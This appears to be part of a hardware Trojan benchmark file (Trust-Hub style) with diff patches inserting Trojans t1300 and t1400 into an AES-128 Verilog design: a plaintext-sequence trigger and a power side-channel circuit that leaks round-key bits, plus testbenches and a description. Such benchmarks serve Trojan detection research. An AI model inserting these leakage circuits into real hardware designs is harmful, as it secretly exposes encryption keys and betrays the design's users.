-    8&apos;h9d: out &lt;= 8&apos;hbc;
-    8&apos;h9e: out &lt;= 8&apos;h16;
-    8&apos;h9f: out &lt;= 8&apos;had;
-    8&apos;ha0: out &lt;= 8&apos;hdb;
-    8&apos;ha1: out &lt;= 8&apos;h64;
-    8&apos;ha2: out &lt;= 8&apos;h74;
-    8&apos;ha3: out &lt;= 8&apos;h14;
-    8&apos;ha4: out &lt;= 8&apos;h92;
-    8&apos;ha5: out &lt;= 8&apos;h0c;
-    8&apos;ha6: out &lt;= 8&apos;h48;
-    8&apos;ha7: out &lt;= 8&apos;hb8;
-    8&apos;ha8: out &lt;= 8&apos;h9f;
-    8&apos;ha9: out &lt;= 8&apos;hbd;
-    8&apos;haa: out &lt;= 8&apos;h43;
-    8&apos;hab: out &lt;= 8&apos;hc4;
-    8&apos;hac: out &lt;= 8&apos;h39;
-    8&apos;had: out &lt;= 8&apos;h31;
-    8&apos;hae: out &lt;= 8&apos;hd3;
-    8&apos;haf: out &lt;= 8&apos;hf2;
-    8&apos;hb0: out &lt;= 8&apos;hd5;
-    8&apos;hb1: out &lt;= 8&apos;h8b;
-    8&apos;hb2: out &lt;= 8&apos;h6e;
-    8&apos;hb3: out &lt;= 8&apos;hda;
-    8&apos;hb4: out &lt;= 8&apos;h01;
-    8&apos;hb5: out &lt;= 8&apos;hb1;
-    8&apos;hb6: out &lt;= 8&apos;h9c;
-    8&apos;hb7: out &lt;= 8&apos;h49;
-    8&apos;hb8: out &lt;= 8&apos;hd8;
-    8&apos;hb9: out &lt;= 8&apos;hac;
-    8&apos;hba: out &lt;= 8&apos;hf3;
-    8&apos;hbb: out &lt;= 8&apos;hcf;
-    8&apos;hbc: out &lt;= 8&apos;hca;
-    8&apos;hbd: out &lt;= 8&apos;hf4;
-    8&apos;hbe: out &lt;= 8&apos;h47;
-    8&apos;hbf: out &lt;= 8&apos;h10;
-    8&apos;hc0: out &lt;= 8&apos;h6f;
-    8&apos;hc1: out &lt;= 8&apos;hf0;
-    8&apos;hc2: out &lt;= 8&apos;h4a;
-    8&apos;hc3: out &lt;= 8&apos;h5c;
-    8&apos;hc4: out &lt;= 8&apos;h38;
-    8&apos;hc5: out &lt;= 8&apos;h57;
-    8&apos;hc6: out &lt;= 8&apos;h73;
-    8&apos;hc7: out &lt;= 8&apos;h97;
-    8&apos;hc8: out &lt;= 8&apos;hcb;
-    8&apos;hc9: out &lt;= 8&apos;ha1;
-    8&apos;hca: out &lt;= 8&apos;he8;
-    8&apos;hcb: out &lt;= 8&apos;h3e;
-    8&apos;hcc: out &lt;= 8&apos;h96;
-    8&apos;hcd: out &lt;= 8&apos;h61;
-    8&apos;hce: out &lt;= 8&apos;h0d;
-    8&apos;hcf: out &lt;= 8&apos;h0f;
-    8&apos;hd0: out &lt;= 8&apos;he0;
-    8&apos;hd1: out &lt;= 8&apos;h7c;
-    8&apos;hd2: out &lt;= 8&apos;h71;
-    8&apos;hd3: out &lt;= 8&apos;hcc;
-    8&apos;hd4: out &lt;= 8&apos;h90;
-    8&apos;hd5: out &lt;= 8&apos;h06;
-    8&apos;hd6: out &lt;= 8&apos;hf7;
-    8&apos;hd7: out &lt;= 8&apos;h1c;
-    8&apos;hd8: out &lt;= 8&apos;hc2;
-    8&apos;hd9: out &lt;= 8&apos;h6a;
-    8&apos;hda: out &lt;= 8&apos;hae;
-    8&apos;hdb: out &lt;= 8&apos;h69;
-    8&apos;hdc: out &lt;= 8&apos;h17;
-    8&apos;hdd: out &lt;= 8&apos;h99;
-    8&apos;hde: out &lt;= 8&apos;h3a;
-    8&apos;hdf: out &lt;= 8&apos;h27;
-    8&apos;he0: out &lt;= 8&apos;hd9;
-    8&apos;he1: out &lt;= 8&apos;heb;
-    8&apos;he2: out &lt;= 8&apos;h2b;
-    8&apos;he3: out &lt;= 8&apos;h22;
-    8&apos;he4: out &lt;= 8&apos;hd2;
-    8&apos;he5: out &lt;= 8&apos;ha9;
-    8&apos;he6: out &lt;= 8&apos;h07;
-    8&apos;he7: out &lt;= 8&apos;h33;
-    8&apos;he8: out &lt;= 8&apos;h2d;
-    8&apos;he9: out &lt;= 8&apos;h3c;
-    8&apos;hea: out &lt;= 8&apos;h15;
-    8&apos;heb: out &lt;= 8&apos;hc9;
-    8&apos;hec: out &lt;= 8&apos;h87;
-    8&apos;hed: out &lt;= 8&apos;haa;
-    8&apos;hee: out &lt;= 8&apos;h50;
-    8&apos;hef: out &lt;= 8&apos;ha5;
-    8&apos;hf0: out &lt;= 8&apos;h03;
-    8&apos;hf1: out &lt;= 8&apos;h59;
-    8&apos;hf2: out &lt;= 8&apos;h09;
-    8&apos;hf3: out &lt;= 8&apos;h1a;
-    8&apos;hf4: out &lt;= 8&apos;h65;
-    8&apos;hf5: out &lt;= 8&apos;hd7;
-    8&apos;hf6: out &lt;= 8&apos;h84;
-    8&apos;hf7: out &lt;= 8&apos;hd0;
-    8&apos;hf8: out &lt;= 8&apos;h82;
-    8&apos;hf9: out &lt;= 8&apos;h29;
-    8&apos;hfa: out &lt;= 8&apos;h5a;
-    8&apos;hfb: out &lt;= 8&apos;h1e;
-    8&apos;hfc: out &lt;= 8&apos;h7b;
-    8&apos;hfd: out &lt;= 8&apos;ha8;
-    8&apos;hfe: out &lt;= 8&apos;h6d;
-    8&apos;hff: out &lt;= 8&apos;h2c;
-    endcase
-endmodule
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1300/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1300/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,100 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1300/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1300/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,36 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out
+    );
+
+	wire [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
+	wire Tj_Trig;
+	
+	aes_128 AES  (clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig);
+	TSC Trojan (rst, clk, Tj_Trig, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1300/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1300/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,38 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger (
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0; 
+		end else if (state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) begin 
+			Tj_Trig &lt;= 1; 
+		end 
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1300/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1300/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,134 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+	 input rst, clk, Tj_Trig, 
+    input [127:0] state,
+	 input [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8
+    );
+
+	reg enable1, enable2, enable3, enable4, enable5, enable6, enable7, enable8;
+	reg [7:0] SHReg1, SHReg2, SHReg3, SHReg4, SHReg5, SHReg6, SHReg7, SHReg8;
+	always @ (rk1)
+		begin
+			enable1 &lt;= Tj_Trig &amp; ((state[0]&amp;rk1[0])^(state[1]&amp;rk1[1])^(state[2]&amp;rk1[2])^(state[3]&amp;rk1[3])^(state[4]&amp;rk1[4])^(state[5]&amp;rk1[5])^(state[6]&amp;rk1[6])^(state[7]&amp;rk1[7]));
+		end
+	always @ (rk2)
+		begin
+			enable2 &lt;= Tj_Trig &amp; ((state[0]&amp;rk2[0])^(state[1]&amp;rk2[1])^(state[2]&amp;rk2[2])^(state[3]&amp;rk2[3])^(state[4]&amp;rk2[4])^(state[5]&amp;rk2[5])^(state[6]&amp;rk2[6])^(state[7]&amp;rk2[7]));
+		end
+	always @ (rk3)
+		begin
+			enable3 &lt;= Tj_Trig &amp; ((state[0]&amp;rk3[0])^(state[1]&amp;rk3[1])^(state[2]&amp;rk3[2])^(state[3]&amp;rk3[3])^(state[4]&amp;rk3[4])^(state[5]&amp;rk3[5])^(state[6]&amp;rk3[6])^(state[7]&amp;rk3[7]));
+		end
+	always @ (rk4)
+		begin
+			enable4 &lt;= Tj_Trig &amp; ((state[0]&amp;rk4[0])^(state[1]&amp;rk4[1])^(state[2]&amp;rk4[2])^(state[3]&amp;rk4[3])^(state[4]&amp;rk4[4])^(state[5]&amp;rk4[5])^(state[6]&amp;rk4[6])^(state[7]&amp;rk4[7]));
+		end
+	always @ (rk5)
+		begin
+			enable5 &lt;= Tj_Trig &amp; ((state[0]&amp;rk5[0])^(state[1]&amp;rk5[1])^(state[2]&amp;rk5[2])^(state[3]&amp;rk5[3])^(state[4]&amp;rk5[4])^(state[5]&amp;rk5[5])^(state[6]&amp;rk5[6])^(state[7]&amp;rk5[7]));
+		end
+	always @ (rk6)
+		begin
+			enable6 &lt;= Tj_Trig &amp; ((state[0]&amp;rk6[0])^(state[1]&amp;rk6[1])^(state[2]&amp;rk6[2])^(state[3]&amp;rk6[3])^(state[4]&amp;rk6[4])^(state[5]&amp;rk6[5])^(state[6]&amp;rk6[6])^(state[7]&amp;rk6[7]));
+		end
+	always @ (rk7)
+		begin
+			enable7 &lt;= Tj_Trig &amp; ((state[0]&amp;rk7[0])^(state[1]&amp;rk7[1])^(state[2]&amp;rk7[2])^(state[3]&amp;rk7[3])^(state[4]&amp;rk7[4])^(state[5]&amp;rk7[5])^(state[6]&amp;rk7[6])^(state[7]&amp;rk7[7]));
+		end
+	always @ (rk8)
+		begin
+			enable8 &lt;= Tj_Trig &amp; ((state[0]&amp;rk8[0])^(state[1]&amp;rk8[1])^(state[2]&amp;rk8[2])^(state[3]&amp;rk8[3])^(state[4]&amp;rk8[4])^(state[5]&amp;rk8[5])^(state[6]&amp;rk8[6])^(state[7]&amp;rk8[7]));
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg1 &lt;= &quot;10101010&quot;;
+			end else if (enable1 == 1) begin
+					SHReg1 &lt;= {SHReg1[0], SHReg1[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg2 &lt;= &quot;10101010&quot;;
+			end else if (enable2 == 1) begin
+					SHReg2 &lt;= {SHReg2[0], SHReg2[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg3 &lt;= &quot;10101010&quot;;
+			end else if (enable3 == 1) begin
+					SHReg3 &lt;= {SHReg3[0], SHReg3[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg4 &lt;= &quot;10101010&quot;;
+			end else if (enable4 == 1) begin
+					SHReg4 &lt;= {SHReg4[0], SHReg4[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg5 &lt;= &quot;10101010&quot;;
+			end else if (enable5 == 1) begin
+					SHReg5 &lt;= {SHReg5[0], SHReg5[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg6 &lt;= &quot;10101010&quot;;
+			end else if (enable6 == 1) begin
+					SHReg6 &lt;= {SHReg6[0], SHReg6[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg7 &lt;= &quot;10101010&quot;;
+			end else if (enable7 == 1) begin
+					SHReg7 &lt;= {SHReg7[0], SHReg7[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg8 &lt;= &quot;10101010&quot;;
+			end else if (enable8 == 1) begin
+					SHReg8 &lt;= {SHReg8[0], SHReg8[7:1]}; 
+			end 
+		end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="7185fb77-4cd9-4c38-92e8-076359e3a4d4" name="t1400" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Once a predefined sequence of input plaintext is observed, the Trojan demonstrates an attack on the AES-128 
	block-cipher and its corresponding key schedule. The idea is to artificially introduce leaking intermediate 
	states in the key schedule that depend on known input bits and key bits, but that naturally would not 
	occur during regular processing of the cipher. The Trojan uses AND conjunctions to pairwise combine each 
	key bit with another input bit. The output of the AND gates are then combined to the leaked intermediate 
	value by XORing all of them. The Trojan leaks one byte of the AES round key for each round of the key schedule. 
	The leakage circuit (LC) is a 16-bit shift register and loaded it with an initial alternating sequence 
	of zeros and ones. The shift register is only enabled in case the input to the leakage circuit is one, 
	which results in an additional dynamic power consumption [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t1400/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t1400/aes_128.v	2015-08-21 12:09:52.000000000 +0200
@@ -14,10 +14,11 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
     input          clk;
     input  [127:0] state, key;
-    output [127:0] out;
+    output [127:0] out;
+	 output [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
     reg    [127:0] s0, k0;
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
@@ -27,7 +28,16 @@ module aes_128(clk, state, key, out);
       begin
         s0 &lt;= state ^ key;
         k0 &lt;= key;
-      end
+      end
+
+	 assign rk1 = k1;
+	 assign rk2 = k2;
+	 assign rk3 = k3;
+	 assign rk4 = k4;
+	 assign rk5 = k5;
+	 assign rk6 = k6;
+	 assign rk7 = k7;
+	 assign rk8 = k8;
 
     expand_key_128
         a1 (clk, k0, k1, k0b, 8&apos;h1),
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1400/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1400/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,100 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1400/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1400/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,36 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out
+    );
+
+	wire [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
+	wire Tj_Trig;
+	
+	aes_128 AES  (clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig);
+	TSC Trojan (rst, clk, Tj_Trig, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1400/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1400/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg State0, State1, State2, State3;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1400/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1400/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,134 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+	 input rst, clk, Tj_Trig, 
+    input [127:0] state,
+	 input [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8
+    );
+
+	reg enable1, enable2, enable3, enable4, enable5, enable6, enable7, enable8;
+	reg [7:0] SHReg1, SHReg2, SHReg3, SHReg4, SHReg5, SHReg6, SHReg7, SHReg8;
+	always @ (rk1)
+		begin
+			enable1 &lt;= Tj_Trig &amp; ((state[0]&amp;rk1[0])^(state[1]&amp;rk1[1])^(state[2]&amp;rk1[2])^(state[3]&amp;rk1[3])^(state[4]&amp;rk1[4])^(state[5]&amp;rk1[5])^(state[6]&amp;rk1[6])^(state[7]&amp;rk1[7]));
+		end
+	always @ (rk2)
+		begin
+			enable2 &lt;= Tj_Trig &amp; ((state[0]&amp;rk2[0])^(state[1]&amp;rk2[1])^(state[2]&amp;rk2[2])^(state[3]&amp;rk2[3])^(state[4]&amp;rk2[4])^(state[5]&amp;rk2[5])^(state[6]&amp;rk2[6])^(state[7]&amp;rk2[7]));
+		end
+	always @ (rk3)
+		begin
+			enable3 &lt;= Tj_Trig &amp; ((state[0]&amp;rk3[0])^(state[1]&amp;rk3[1])^(state[2]&amp;rk3[2])^(state[3]&amp;rk3[3])^(state[4]&amp;rk3[4])^(state[5]&amp;rk3[5])^(state[6]&amp;rk3[6])^(state[7]&amp;rk3[7]));
+		end
+	always @ (rk4)
+		begin
+			enable4 &lt;= Tj_Trig &amp; ((state[0]&amp;rk4[0])^(state[1]&amp;rk4[1])^(state[2]&amp;rk4[2])^(state[3]&amp;rk4[3])^(state[4]&amp;rk4[4])^(state[5]&amp;rk4[5])^(state[6]&amp;rk4[6])^(state[7]&amp;rk4[7]));
+		end
+	always @ (rk5)
+		begin
+			enable5 &lt;= Tj_Trig &amp; ((state[0]&amp;rk5[0])^(state[1]&amp;rk5[1])^(state[2]&amp;rk5[2])^(state[3]&amp;rk5[3])^(state[4]&amp;rk5[4])^(state[5]&amp;rk5[5])^(state[6]&amp;rk5[6])^(state[7]&amp;rk5[7]));
+		end
+	always @ (rk6)
+		begin
+			enable6 &lt;= Tj_Trig &amp; ((state[0]&amp;rk6[0])^(state[1]&amp;rk6[1])^(state[2]&amp;rk6[2])^(state[3]&amp;rk6[3])^(state[4]&amp;rk6[4])^(state[5]&amp;rk6[5])^(state[6]&amp;rk6[6])^(state[7]&amp;rk6[7]));
+		end
+	always @ (rk7)
+		begin
+			enable7 &lt;= Tj_Trig &amp; ((state[0]&amp;rk7[0])^(state[1]&amp;rk7[1])^(state[2]&amp;rk7[2])^(state[3]&amp;rk7[3])^(state[4]&amp;rk7[4])^(state[5]&amp;rk7[5])^(state[6]&amp;rk7[6])^(state[7]&amp;rk7[7]));
+		end
+	always @ (rk8)
+		begin
+			enable8 &lt;= Tj_Trig &amp; ((state[0]&amp;rk8[0])^(state[1]&amp;rk8[1])^(state[2]&amp;rk8[2])^(state[3]&amp;rk8[3])^(state[4]&amp;rk8[4])^(state[5]&amp;rk8[5])^(state[6]&amp;rk8[6])^(state[7]&amp;rk8[7]));
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg1 &lt;= &quot;10101010&quot;;
+			end else if (enable1 == 1) begin
+					SHReg1 &lt;= {SHReg1[0], SHReg1[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg2 &lt;= &quot;10101010&quot;;
+			end else if (enable2 == 1) begin
+					SHReg2 &lt;= {SHReg2[0], SHReg2[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg3 &lt;= &quot;10101010&quot;;
+			end else if (enable3 == 1) begin
+					SHReg3 &lt;= {SHReg3[0], SHReg3[7:1]}; 
+			end 
+		end
+
